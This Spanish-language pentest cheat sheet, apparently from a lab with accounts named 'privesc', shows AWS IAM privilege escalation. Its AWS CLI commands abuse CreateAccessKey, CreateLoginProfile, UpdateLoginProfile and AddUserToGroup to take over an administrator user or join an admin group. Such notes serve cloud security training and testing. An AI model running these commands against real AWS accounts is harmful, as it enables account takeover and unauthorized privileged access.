# Permisos de IAM en otros usuarios

## iam:CreateAccessKey:  
Permite a un usuario crear nuevas claves de acceso para una cuenta, potencialmente otorgando acceso no autorizado.  

```bash
aws iam list-attached-user-policies --user-name privesc4-CreateAccessKey-user  
aws iam get-policy-version --policy-arn arn:aws:iam::651927172911:policy/privesc4-CreateAccessKey --version-id v1  
aws configure --profile privesc4  
aws sts get-caller-identity --profile privesc4  
aws iam create-access-key --user-name Test-Administrador --profile privesc4  
aws iam add-user-to-group --group-name Group-Root-Test --user-name privesc4-CreateAccessKey-user --profile hack-admin  
```


## iam:CreateLoginProfile:  
Habilita la creación de un perfil de inicio de sesión para usuarios que no lo tienen, permitiendo establecer contraseñas para cuentas potencialmente más privilegiadas.  

```bash
aws iam list-attached-user-policies --user-name privesc5-CreateLoginProfile-user  
aws iam get-policy-version --policy-arn arn:aws:iam::651927172911:policy/privesc5-CreateLoginProfile --version-id v1  
aws sts assume-role --role-arn arn:aws:iam::651927172911:role/privesc5-CreateLoginProfile-role --role-session-name privesc5  
aws configure --profile privesc5  
aws sts get-caller-identity --profile privesc5  
aws iam create-login-profile --user-name Test-Administrador --password ContraseñaSegura123  
```

## iam:UpdateLoginProfile:  
Permite modificar el perfil de inicio de sesión de un usuario, incluida la contraseña, lo que puede ser utilizado para tomar el control de una cuenta de mayor privilegio.  

```bash
aws iam list-attached-user-policies --user-name privesc6-UpdateLoginProfile-user  
aws iam get-policy-version --policy-arn arn:aws:iam::651927172911:policy/privesc6-UpdateLoginProfile --version-id v1  
aws sts assume-role --role-arn arn:aws:iam::651927172911:role/privesc6-UpdateLoginProfile-role --role-session-name privesc6  
aws configure --profile privesc6  
aws sts get-caller-identity --profile privesc6  
aws iam update-login-profile --user-name Test-Administrador --password Password321 --no-password-reset-required --profile privesc6  
```

## iam:AddUserToGroup:  
Facilita la adición de usuarios a grupos, lo cual puede ser explotado para otorgar a un usuario acceso a permisos y recursos que no debería tener.  

```bash
aws iam list-attached-user-policies --user-name privesc13-AddUserToGroup-user  
aws iam get-policy-version --policy-arn arn:aws:iam::651927172911:policy/privesc13-AddUserToGroup --version-id v1  
aws sts assume-role --role-arn arn:aws:iam::651927172911:role/privesc13-AddUserToGroup-role --role-session-name privesc13  
aws configure --profile privesc13  
aws sts get-caller-identity --profile privesc13  
aws iam add-user-to-group --group-name Group-Root-Test --user-name privesc13-AddUserToGroup-user --profile privesc13  
```